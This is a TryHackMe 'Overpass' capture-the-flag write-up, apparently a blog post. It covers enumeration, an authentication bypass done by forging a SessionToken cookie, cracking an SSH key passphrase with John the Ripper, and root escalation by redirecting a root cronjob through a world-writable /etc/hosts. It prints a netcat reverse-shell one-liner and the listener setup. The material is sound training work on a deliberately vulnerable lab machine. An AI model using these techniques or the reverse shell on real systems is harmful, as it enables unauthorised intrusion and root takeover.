@@ -1,0 +1,170 @@
+---
+layout: post
+title:  "Overpass - TryHackMe writeup"
+date:   2024-08-21 10:00:00 +0200
+categories: tryhackme ctf writeup
+---
+{:refdef: style="text-align: center;"}
+[![Challenge logo](/assets/overpass/0_title.png)](/assets/overpass/0_title.png){:target="_blank"}
+{:refdef}
+
+**CTF Name**: [Overpass](https://tryhackme.com/r/room/overpass){:target="_blank"}  
+**Description**: What happens when some broke CompSci students make a password manager?  
+**Categories**: Linux, Web Application, OWASP Top 10, Privilege Escalation  
+**Difficulty**: Easy  
+
+Let's begin with the usual enumeration. Scanning the target with **nmap** reveals that it is exposing something on port **80**.
+
+{:refdef: style="text-align: center;"}
+[![Nmap scan](/assets/overpass/1_nmap.png)](/assets/overpass/1_nmap.png){:target="_blank"}
+{:refdef}
+
+While nmap finishes its job, let's visit the target with a browser to take a look at the website it is serving.
+
+{:refdef: style="text-align: center;"}
+[![Website](/assets/overpass/2_website.png)](/assets/overpass/2_website.png){:target="_blank"}
+{:refdef}
+
+Scanning the website with **gobuster** reveals an interesting directory, **/admin**.
+
+{:refdef: style="text-align: center;"}
+[![Gobuster](/assets/overpass/3_gobuster.png)](/assets/overpass/3_gobuster.png){:target="_blank"}
+{:refdef}
+
+On this page we can see a login form. There are several ways to break login forms, but many seem unfeasible. Default insecure credentials such as **admin:admin**, **admin:password**, or **admin:123456** do not seem to work. Trying to bypass the authentication form with **SQL Injection** (by inserting **' OR 1 = 1;--** in either field) does not seem to work either. **Cross Site Scripting** also seems unfeasible.
+
+Going back to inspect the default page's code, nothing useful can be found (except for a funny comment).
+
+{:refdef: style="text-align: center;"}
+[![Website source code](/assets/overpass/4_page_source.png)](/assets/overpass/4_page_source.png){:target="_blank"}
+{:refdef}
+
+Switching to the console tab, however, displays a "Hello World" message. Have the developers forgot to remove some test code? Or perhaps some code may be revealing information about our target.
+
+{:refdef: style="text-align: center;"}
+[![Console](/assets/overpass/5_console.png)](/assets/overpass/5_console.png){:target="_blank"}
+{:refdef}
+
+Going back to **/admin** we can notice that not only does this happen again, but when observing the downloaded JavaScript code there are two more files that may be of interest.
+
+{:refdef: style="text-align: center;"}
+[![JavaScript files](/assets/overpass/6_js_files.png)](/assets/overpass/6_js_files.png){:target="_blank"}
+{:refdef}
+
+The file responsible for the "Hello World" message is **main.js**, which only does this. The **cookie.js** file seems like a one-liner that defines a custom cookie, while the **login.js** file seems more of interest.
+
+Inspecting this file reveals that the **login()** function that handles the login process is expecting a response from the API. This response is either "**Incorrect credentials**", or a value for a cookie that has "**SessionToken**" as key. We could try setting this cookie's value to something specific, hoping that it is enough to bypass the login form.
+
+{:refdef: style="text-align: center;"}
+[![Login form](/assets/overpass/7_login_js.png)](/assets/overpass/7_login_js.png){:target="_blank"}
+{:refdef}
+
+Running **Cookies.set("SessionToken", "admin")** in the console will set the value for "**SessionToken**" to be "**admin**".
+
+**Note**: you may have to enable pasting commands into the console by following the instructions provided by your browser. Some browsers require this as a form of prevention.
+
+{:refdef: style="text-align: center;"}
+[![Setting the malicious cookie](/assets/overpass/8_malicious_cookie_1.png)](/assets/overpass/8_malicious_cookie_1.png){:target="_blank"}
+{:refdef}
+
+Now refreshing the page will let us in as the website is not managing authentication properly. We can see the cookie we just set, and also the administrator dashboard.
+
+{:refdef: style="text-align: center;"}
+[![The malicious cookie was saved](/assets/overpass/9_malicious_cookie_2.png)](/assets/overpass/9_malicious_cookie_2.png){:target="_blank"}
+{:refdef}
+
+Here we meet some interesting information: we get to know that **James** is a user that can log in via **SSH**, and we even get his **private SSH key**.
+
+{:refdef: style="text-align: center;"}
+[![Private SSH key](/assets/overpass/10_private_key.png)](/assets/overpass/10_private_key.png){:target="_blank"}
+{:refdef}
+
+After copying this key into a file and changing its permissions with **chmod 400 KEYFILE** (to avoid the "**Unprotected private key file!**" error) we can finally try SSHing into the target machine, but we will be met by a prompt asking for a **passphrase**. We still cannot use this private key as it has to be decrypted (as the page and the key's header themselves were also telling us).
+
+{:refdef: style="text-align: center;"}
+[![Passphrase requested](/assets/overpass/11_passphrase.png)](/assets/overpass/11_passphrase.png){:target="_blank"}
+{:refdef}
+
+Before actually cracking this key we have to transform it into a suitable format. Running **ssh2john KEYFILE > HASHFILE** will output a crackable hash into the file **HASHFILE**.
+
+**Note**: if you are not running Kali Linux (or if you are using an older version) you may have to install this tool. To do so, simply download it with
+
+{% highlight bash %}
+curl https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py -o ssh2john.py
+{% endhighlight %}
+
+and then run **python3 ssh2john KEYFILE > HASHFILE**.
+
+{:refdef: style="text-align: center;"}
+[![Converting the encrypted private key](/assets/overpass/12_ssh2john.png)](/assets/overpass/12_ssh2john.png){:target="_blank"}
+{:refdef}
+
+We can now crack this hash with **sudo john HASHFILE -w=/usr/share/wordlists/rockyou.txt**.
+
+It won't take long before James' passphrase is in our hands.
+
+{:refdef: style="text-align: center;"}
+[![Cracking the passphrase](/assets/overpass/13_cracked_passphrase.png)](/assets/overpass/13_cracked_passphrase.png){:target="_blank"}
+{:refdef}
+
+We can now SSH into the target machine.
+
+Exploring the **/home** directory (James' directory in particular) we can find the **user.txt** file which contains the first flag of this challenge.
+
+{:refdef: style="text-align: center;"}
+[![User flag](/assets/overpass/14_user_flag.png)](/assets/overpass/14_user_flag.png){:target="_blank"}
+{:refdef}
+
+There is another file in this directory, **todo.txt**, which may be of interest. As a matter of fact, reading this file we learn that there is an automated build script running somewhere. Let's see... if there are any **cronjobs** that run this script by reading **/etc/crontab**...
+
+Indeed, there is a cronjob that downloads a script and then runs it in bash... with **root privileges**! This actually happens every minute.
+
+{:refdef: style="text-align: center;"}
+[![Crontab](/assets/overpass/15_crontab.png)](/assets/overpass/15_crontab.png){:target="_blank"}
+{:refdef}
+
+Since this script is downloaded and ran as **root**, we could easily provide a malicious script to escalate our privileges. We do not have control over the machine that serves this file, but if we had **write access** to the **/etc/hosts** file we could create an entry that would resolve to a server we can actually control. The malicious server will then serve a script which would get executed as root on our target machine.
+
+Running **ls -l /etc/hosts** we can see that it is indeed **world-writable**.
+
+{:refdef: style="text-align: center;"}
+[![Hosts file](/assets/overpass/16_etc_hosts.png)](/assets/overpass/16_etc_hosts.png){:target="_blank"}
+{:refdef}
+
+Reading it we can see that there is an entry for **overpass.thm** already, so let's comment it out and add our own entry. Our entry will resolve to the IP address of our attacking machine. From now on, each request done on **overpass.thm** will be sent to our own machine.
+
+We still have to create our own malicious script, so let's create a path that is similar to the one queried by the cronjob on our machine. From a comfortable directory in our attacking machine (which is **~/TryHackMe/Overpass** for me), we can run **mkdir downloads/** and **mkdir downloads/src/** to create the appropriate path, while **touch downloads/src/buildscript.sh** will create the file.
+
+Before editing this file, let's go back to the target machine and verify that **netcat** is installed and that it supports the **-e** flag.
+
+{:refdef: style="text-align: center;"}
+[![Checking that netcat supports an appropriate flag](/assets/overpass/17_netcat.png)](/assets/overpass/17_netcat.png){:target="_blank"}
+{:refdef}
+
+Unfortunately it doesn't, but that won't stop us!
+
+Let's go back to our machine and edit the newly created script to open a reverse shell to our own machine with the following one-liner:
+
+{% highlight bash %}
+/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP_ADDRESS PORT >/tmp/f
+{% endhighlight %}
+
+Remember to use your own IP address and a port number of your choice.
+
+{:refdef: style="text-align: center;"}
+[![Setting up the reverse shell](/assets/overpass/18_reverse_shell_script.png)](/assets/overpass/18_reverse_shell_script.png){:target="_blank"}
+{:refdef}
+
+Now let’s run a listener on our attacking machine with **nc -lvnp 4444** and make our home directory available by running **python -m http.server 80** (this runs a **HTTP server** on port **80**) in another terminal window, and in less than a minute we should receive a connection from the target machine.
+
+{:refdef: style="text-align: center;"}
+[![HTTP server](/assets/overpass/19_HTTP_server.png)](/assets/overpass/19_HTTP_server.png){:target="_blank"}
+{:refdef}
+
+{:refdef: style="text-align: center;"}
+[![Root shell](/assets/overpass/20_root_shell.png)](/assets/overpass/20_root_shell.png){:target="_blank"}
+{:refdef}
+
+Normally we would be interested in converting this shell to a fully interactive shell, but as the objective - the **root flag** - is right around the corner we can just reach it this way.
+
+If you’re interested in converting this shell in a fully interactive one, you can read how to in my previous writeup, [LazyAdmin]({% link _posts/2024-08-19-Lazy-Admin.markdown %})!
